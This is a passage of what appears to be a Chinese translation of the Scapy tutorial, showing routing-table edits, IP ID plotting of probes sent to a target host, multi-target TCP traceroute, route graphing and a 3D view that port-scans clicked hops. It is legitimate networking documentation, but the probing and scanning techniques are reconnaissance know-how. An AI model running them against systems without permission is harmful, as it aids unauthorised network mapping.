<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.route</span><br><span class="line">Network         Netmask         Gateway         Iface</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         lo</span><br><span class="line"><span class="number">192.168</span><span class="number">.8</span><span class="number">.0</span>     <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         eth0</span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>     eth0</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.route.delt(net=<span class="string">"0.0.0.0/0"</span>,gw=<span class="string">"192.168.8.1"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.route.add(net=<span class="string">"0.0.0.0/0"</span>,gw=<span class="string">"192.168.8.254"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.route.add(host=<span class="string">"192.168.1.1"</span>,gw=<span class="string">"192.168.8.1"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.route</span><br><span class="line">Network         Netmask         Gateway         Iface</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         lo</span><br><span class="line"><span class="number">192.168</span><span class="number">.8</span><span class="number">.0</span>     <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         eth0</span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         <span class="number">192.168</span><span class="number">.8</span><span class="number">.254</span>   eth0</span><br><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>     <span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span> <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>     eth0</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.route.resync()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.route</span><br><span class="line">Network         Netmask         Gateway         Iface</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         lo</span><br><span class="line"><span class="number">192.168</span><span class="number">.8</span><span class="number">.0</span>     <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         eth0</span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>         <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>     eth0</span><br></pre></td></tr></table></figure>

<h3 id="Matplotlib"><a href="#Matplotlib" class="headerlink" title="Matplotlib"></a>Matplotlib</h3><p> 我们可以很容易地将收集起来的数据绘制成图案。（确保你已经安装了matplotlib）例如，我们可以通过观察图案知道负载平衡器用了多少个不同的IP堆栈： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a, b = sr(IP(dst=<span class="string">"www.target.com"</span>)/TCP(sport=[RandShort()]*<span class="number">1000</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.plot(<span class="keyword">lambda</span> x:x[<span class="number">1</span>].id)</span><br><span class="line">[&lt;matplotlib.lines.Line2D at <span class="number">0x2367b80d6a0</span>&gt;]</span><br></pre></td></tr></table></figure>

<p><img src="ipid.png" alt="_images/ipid.png"></p>
<h3 id="TCP-traceroute-2"><a href="#TCP-traceroute-2" class="headerlink" title="TCP traceroute (2)"></a>TCP traceroute (2)</h3><p> Scapy也有强大的TCP traceroute功能。并不像其他traceroute程序那样，需要等待每个节点的回应才去下一个节点，scapy会在同一时间发送所有的数据包。其缺点就是不知道什么时候停止（所以就有maxttl参数），其巨大的优点就是，只用了不到3秒，就可以得到多目标的traceroute结果： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>traceroute([<span class="string">"www.yahoo.com"</span>,<span class="string">"www.altavista.com"</span>,<span class="string">"www.wisenut.com"</span>,<span class="string">"www.copernic.com"</span>],maxttl=<span class="number">20</span>)</span><br><span class="line">Received <span class="number">80</span> packets, got <span class="number">80</span> answers, remaining <span class="number">0</span> packets</span><br><span class="line">   <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>:<span class="number">80</span>    <span class="number">216.109</span><span class="number">.118</span><span class="number">.79</span>:<span class="number">80</span>  <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>:<span class="number">80</span>  <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>:<span class="number">80</span></span><br><span class="line"><span class="number">1</span>  <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span></span><br><span class="line"><span class="number">2</span>  <span class="number">82.243</span><span class="number">.5</span><span class="number">.254</span>       <span class="number">82.243</span><span class="number">.5</span><span class="number">.254</span>       <span class="number">82.243</span><span class="number">.5</span><span class="number">.254</span>       <span class="number">82.243</span><span class="number">.5</span><span class="number">.254</span></span><br><span class="line"><span class="number">3</span>  <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span></span><br><span class="line"><span class="number">4</span>  <span class="number">212.27</span><span class="number">.50</span><span class="number">.46</span>       <span class="number">212.27</span><span class="number">.50</span><span class="number">.46</span>       <span class="number">212.27</span><span class="number">.50</span><span class="number">.46</span>       <span class="number">212.27</span><span class="number">.50</span><span class="number">.46</span></span><br><span class="line"><span class="number">5</span>  <span class="number">212.27</span><span class="number">.50</span><span class="number">.37</span>       <span class="number">212.27</span><span class="number">.50</span><span class="number">.41</span>       <span class="number">212.27</span><span class="number">.50</span><span class="number">.37</span>       <span class="number">212.27</span><span class="number">.50</span><span class="number">.41</span></span><br><span class="line"><span class="number">6</span>  <span class="number">212.27</span><span class="number">.50</span><span class="number">.34</span>       <span class="number">212.27</span><span class="number">.50</span><span class="number">.34</span>       <span class="number">213.228</span><span class="number">.3</span><span class="number">.234</span>      <span class="number">193.251</span><span class="number">.251</span><span class="number">.69</span></span><br><span class="line"><span class="number">7</span>  <span class="number">213.248</span><span class="number">.71</span><span class="number">.141</span>     <span class="number">217.118</span><span class="number">.239</span><span class="number">.149</span>    <span class="number">208.184</span><span class="number">.231</span><span class="number">.214</span>    <span class="number">193.251</span><span class="number">.241</span><span class="number">.178</span></span><br><span class="line"><span class="number">8</span>  <span class="number">213.248</span><span class="number">.65</span><span class="number">.81</span>      <span class="number">217.118</span><span class="number">.224</span><span class="number">.44</span>     <span class="number">64.125</span><span class="number">.31</span><span class="number">.129</span>      <span class="number">193.251</span><span class="number">.242</span><span class="number">.98</span></span><br><span class="line"><span class="number">9</span>  <span class="number">213.248</span><span class="number">.70</span><span class="number">.14</span>      <span class="number">213.206</span><span class="number">.129</span><span class="number">.85</span>     <span class="number">64.125</span><span class="number">.31</span><span class="number">.186</span>      <span class="number">193.251</span><span class="number">.243</span><span class="number">.89</span></span><br><span class="line"><span class="number">10</span> <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>    SA <span class="number">213.206</span><span class="number">.128</span><span class="number">.160</span>    <span class="number">64.125</span><span class="number">.29</span><span class="number">.122</span>      <span class="number">193.251</span><span class="number">.254</span><span class="number">.126</span></span><br><span class="line"><span class="number">11</span> <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>    SA <span class="number">206.24</span><span class="number">.169</span><span class="number">.41</span>      <span class="number">64.125</span><span class="number">.28</span><span class="number">.70</span>       <span class="number">216.115</span><span class="number">.97</span><span class="number">.178</span></span><br><span class="line"><span class="number">12</span> <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>    SA <span class="number">206.24</span><span class="number">.226</span><span class="number">.99</span>      <span class="number">64.125</span><span class="number">.28</span><span class="number">.209</span>      <span class="number">66.218</span><span class="number">.64</span><span class="number">.146</span></span><br><span class="line"><span class="number">13</span> <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>    SA <span class="number">206.24</span><span class="number">.227</span><span class="number">.106</span>     <span class="number">64.125</span><span class="number">.29</span><span class="number">.45</span>       <span class="number">66.218</span><span class="number">.82</span><span class="number">.230</span></span><br><span class="line"><span class="number">14</span> <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>    SA <span class="number">216.109</span><span class="number">.74</span><span class="number">.30</span>      <span class="number">64.125</span><span class="number">.31</span><span class="number">.214</span>      <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">15</span> <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>    SA <span class="number">216.109</span><span class="number">.120</span><span class="number">.149</span>    <span class="number">64.124</span><span class="number">.229</span><span class="number">.109</span>     <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">16</span> <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>    SA <span class="number">216.109</span><span class="number">.118</span><span class="number">.79</span>  SA <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>  SA <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">17</span> <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>    SA <span class="number">216.109</span><span class="number">.118</span><span class="number">.79</span>  SA <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>  SA <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">18</span> <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>    SA <span class="number">216.109</span><span class="number">.118</span><span class="number">.79</span>  SA <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>  SA <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">19</span> <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>    SA <span class="number">216.109</span><span class="number">.118</span><span class="number">.79</span>  SA <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>  SA <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">20</span> <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>    SA <span class="number">216.109</span><span class="number">.118</span><span class="number">.79</span>  SA <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>  SA <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line">(&lt;Traceroute: UDP:<span class="number">0</span> TCP:<span class="number">28</span> ICMP:<span class="number">52</span> Other:<span class="number">0</span>&gt;, &lt;Unanswered: UDP:<span class="number">0</span> TCP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">0</span>&gt;)</span><br></pre></td></tr></table></figure>

<p> 最后一行实际上是该函数的返回结果：traceroute返回一个对象和无应答数据包列表。traceroute返回的是一个经典返回对象更加特殊的版本（实际上是一个子类）。我们可以将其保存以备后用，或者是进行一些例如检查填充的更深层次的观察： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>result, unans = _</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result.show()</span><br><span class="line">   <span class="number">193.45</span><span class="number">.10</span><span class="number">.88</span>:<span class="number">80</span>    <span class="number">216.109</span><span class="number">.118</span><span class="number">.79</span>:<span class="number">80</span>  <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>:<span class="number">80</span>  <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>:<span class="number">80</span></span><br><span class="line"><span class="number">1</span>  <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span></span><br><span class="line"><span class="number">2</span>  <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span>       <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span>       <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span>       <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span></span><br><span class="line"><span class="number">3</span>  <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span></span><br><span class="line">[...]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result.filter(<span class="keyword">lambda</span> x: Padding <span class="keyword">in</span> x[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p> 和其他返回对象一样，traceroute对象也可以相加： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r2, unans = traceroute([<span class="string">"www.voila.com"</span>],maxttl=<span class="number">20</span>)</span><br><span class="line">Received <span class="number">19</span> packets, got <span class="number">19</span> answers, remaining <span class="number">1</span> packets</span><br><span class="line">   <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>:<span class="number">80</span></span><br><span class="line"><span class="number">1</span>  <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span></span><br><span class="line"><span class="number">2</span>  <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span></span><br><span class="line"><span class="number">3</span>  <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span></span><br><span class="line"><span class="number">4</span>  <span class="number">212.27</span><span class="number">.50</span><span class="number">.169</span></span><br><span class="line"><span class="number">5</span>  <span class="number">212.27</span><span class="number">.50</span><span class="number">.162</span></span><br><span class="line"><span class="number">6</span>  <span class="number">193.252</span><span class="number">.161</span><span class="number">.97</span></span><br><span class="line"><span class="number">7</span>  <span class="number">193.252</span><span class="number">.103</span><span class="number">.86</span></span><br><span class="line"><span class="number">8</span>  <span class="number">193.252</span><span class="number">.103</span><span class="number">.77</span></span><br><span class="line"><span class="number">9</span>  <span class="number">193.252</span><span class="number">.101</span><span class="number">.1</span></span><br><span class="line"><span class="number">10</span> <span class="number">193.252</span><span class="number">.227</span><span class="number">.245</span></span><br><span class="line"><span class="number">12</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA</span><br><span class="line"><span class="number">13</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA</span><br><span class="line"><span class="number">14</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA</span><br><span class="line"><span class="number">15</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA</span><br><span class="line"><span class="number">16</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA</span><br><span class="line"><span class="number">17</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA</span><br><span class="line"><span class="number">18</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA</span><br><span class="line"><span class="number">19</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA</span><br><span class="line"><span class="number">20</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r3=result+r2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r3.show()</span><br><span class="line">   <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>:<span class="number">80</span>   <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>:<span class="number">80</span>    <span class="number">216.109</span><span class="number">.118</span><span class="number">.72</span>:<span class="number">80</span>  <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>:<span class="number">80</span>  <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>:<span class="number">80</span></span><br><span class="line"><span class="number">1</span>  <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span></span><br><span class="line"><span class="number">2</span>  <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span>       <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span>       <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span>       <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span>       <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span></span><br><span class="line"><span class="number">3</span>  <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span></span><br><span class="line"><span class="number">4</span>  <span class="number">212.27</span><span class="number">.50</span><span class="number">.169</span>      <span class="number">212.27</span><span class="number">.50</span><span class="number">.169</span>      <span class="number">212.27</span><span class="number">.50</span><span class="number">.46</span>       -                  <span class="number">212.27</span><span class="number">.50</span><span class="number">.46</span></span><br><span class="line"><span class="number">5</span>  <span class="number">212.27</span><span class="number">.50</span><span class="number">.162</span>      <span class="number">212.27</span><span class="number">.50</span><span class="number">.162</span>      <span class="number">212.27</span><span class="number">.50</span><span class="number">.37</span>       <span class="number">212.27</span><span class="number">.50</span><span class="number">.41</span>       <span class="number">212.27</span><span class="number">.50</span><span class="number">.37</span></span><br><span class="line"><span class="number">6</span>  <span class="number">193.252</span><span class="number">.161</span><span class="number">.97</span>     <span class="number">194.68</span><span class="number">.129</span><span class="number">.168</span>     <span class="number">212.27</span><span class="number">.50</span><span class="number">.34</span>       <span class="number">213.228</span><span class="number">.3</span><span class="number">.234</span>      <span class="number">193.251</span><span class="number">.251</span><span class="number">.69</span></span><br><span class="line"><span class="number">7</span>  <span class="number">193.252</span><span class="number">.103</span><span class="number">.86</span>     <span class="number">212.23</span><span class="number">.42</span><span class="number">.33</span>       <span class="number">217.118</span><span class="number">.239</span><span class="number">.185</span>    <span class="number">208.184</span><span class="number">.231</span><span class="number">.214</span>    <span class="number">193.251</span><span class="number">.241</span><span class="number">.178</span></span><br><span class="line"><span class="number">8</span>  <span class="number">193.252</span><span class="number">.103</span><span class="number">.77</span>     <span class="number">212.23</span><span class="number">.42</span><span class="number">.6</span>        <span class="number">217.118</span><span class="number">.224</span><span class="number">.44</span>     <span class="number">64.125</span><span class="number">.31</span><span class="number">.129</span>      <span class="number">193.251</span><span class="number">.242</span><span class="number">.98</span></span><br><span class="line"><span class="number">9</span>  <span class="number">193.252</span><span class="number">.101</span><span class="number">.1</span>      <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">213.206</span><span class="number">.129</span><span class="number">.85</span>     <span class="number">64.125</span><span class="number">.31</span><span class="number">.186</span>      <span class="number">193.251</span><span class="number">.243</span><span class="number">.89</span></span><br><span class="line"><span class="number">10</span> <span class="number">193.252</span><span class="number">.227</span><span class="number">.245</span>    <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">213.206</span><span class="number">.128</span><span class="number">.160</span>    <span class="number">64.125</span><span class="number">.29</span><span class="number">.122</span>      <span class="number">193.251</span><span class="number">.254</span><span class="number">.126</span></span><br><span class="line"><span class="number">11</span> -                  <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">206.24</span><span class="number">.169</span><span class="number">.41</span>      <span class="number">64.125</span><span class="number">.28</span><span class="number">.70</span>       <span class="number">216.115</span><span class="number">.97</span><span class="number">.178</span></span><br><span class="line"><span class="number">12</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">206.24</span><span class="number">.226</span><span class="number">.100</span>     <span class="number">64.125</span><span class="number">.28</span><span class="number">.209</span>      <span class="number">216.115</span><span class="number">.101</span><span class="number">.46</span></span><br><span class="line"><span class="number">13</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">206.24</span><span class="number">.238</span><span class="number">.166</span>     <span class="number">64.125</span><span class="number">.29</span><span class="number">.45</span>       <span class="number">66.218</span><span class="number">.82</span><span class="number">.234</span></span><br><span class="line"><span class="number">14</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">216.109</span><span class="number">.74</span><span class="number">.30</span>      <span class="number">64.125</span><span class="number">.31</span><span class="number">.214</span>      <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">15</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">216.109</span><span class="number">.120</span><span class="number">.151</span>    <span class="number">64.124</span><span class="number">.229</span><span class="number">.109</span>     <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">16</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">216.109</span><span class="number">.118</span><span class="number">.72</span>  SA <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>  SA <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">17</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">216.109</span><span class="number">.118</span><span class="number">.72</span>  SA <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>  SA <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">18</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">216.109</span><span class="number">.118</span><span class="number">.72</span>  SA <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>  SA <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">19</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">216.109</span><span class="number">.118</span><span class="number">.72</span>  SA <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>  SA <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br><span class="line"><span class="number">20</span> <span class="number">195.101</span><span class="number">.94</span><span class="number">.25</span>   SA <span class="number">212.23</span><span class="number">.37</span><span class="number">.13</span>    SA <span class="number">216.109</span><span class="number">.118</span><span class="number">.72</span>  SA <span class="number">64.241</span><span class="number">.242</span><span class="number">.243</span>  SA <span class="number">66.94</span><span class="number">.229</span><span class="number">.254</span>   SA</span><br></pre></td></tr></table></figure>

<p> Traceroute返回对象有一个非常实用的功能：他们会将得到的所有路线做成一个有向图，并用AS组织路线。你需要安装graphviz。在默认情况下会使用ImageMagick显示图形。 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>res, unans = traceroute([<span class="string">"www.microsoft.com"</span>,<span class="string">"www.cisco.com"</span>,<span class="string">"www.yahoo.com"</span>,<span class="string">"www.wanadoo.fr"</span>,<span class="string">"www.pacsec.com"</span>],dport=[<span class="number">80</span>,<span class="number">443</span>],maxttl=<span class="number">20</span>,retry=<span class="number">-2</span>)</span><br><span class="line">Received <span class="number">190</span> packets, got <span class="number">190</span> answers, remaining <span class="number">10</span> packets</span><br><span class="line">   <span class="number">193.252</span><span class="number">.122</span><span class="number">.103</span>:<span class="number">443</span> <span class="number">193.252</span><span class="number">.122</span><span class="number">.103</span>:<span class="number">80</span> <span class="number">198.133</span><span class="number">.219</span><span class="number">.25</span>:<span class="number">443</span> <span class="number">198.133</span><span class="number">.219</span><span class="number">.25</span>:<span class="number">80</span>  <span class="number">207.46</span>...</span><br><span class="line"><span class="number">1</span>  <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>         <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>        <span class="number">192.16</span>...</span><br><span class="line"><span class="number">2</span>  <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span>        <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span>       <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span>       <span class="number">82.251</span><span class="number">.4</span><span class="number">.254</span>       <span class="number">82.251</span>...</span><br><span class="line"><span class="number">3</span>  <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>       <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>      <span class="number">213.22</span>...</span><br><span class="line">[...]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.graph()                          <span class="comment"># piped to ImageMagick's display program. Image below.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.graph(type=<span class="string">"ps"</span>,target=<span class="string">"| lp"</span>)   <span class="comment"># piped to postscript printer</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.graph(target=<span class="string">"&gt; /tmp/graph.svg"</span>) <span class="comment"># saved to file</span></span><br></pre></td></tr></table></figure>

<p><img src="graph_traceroute.png" alt="_images/graph_traceroute.png"></p>
<p> 如果你安装了VPython，你就可以用3D来表示traceroute。右边的按钮是旋转图案，中间的按钮是放大缩小，左边的按钮是移动图案。如果你单击一个球，它的IP地址就会出现/消失。如果你按住Ctrl单击一个球，就会扫描21,22,23,25,80和443端口，并显示结果： </p>
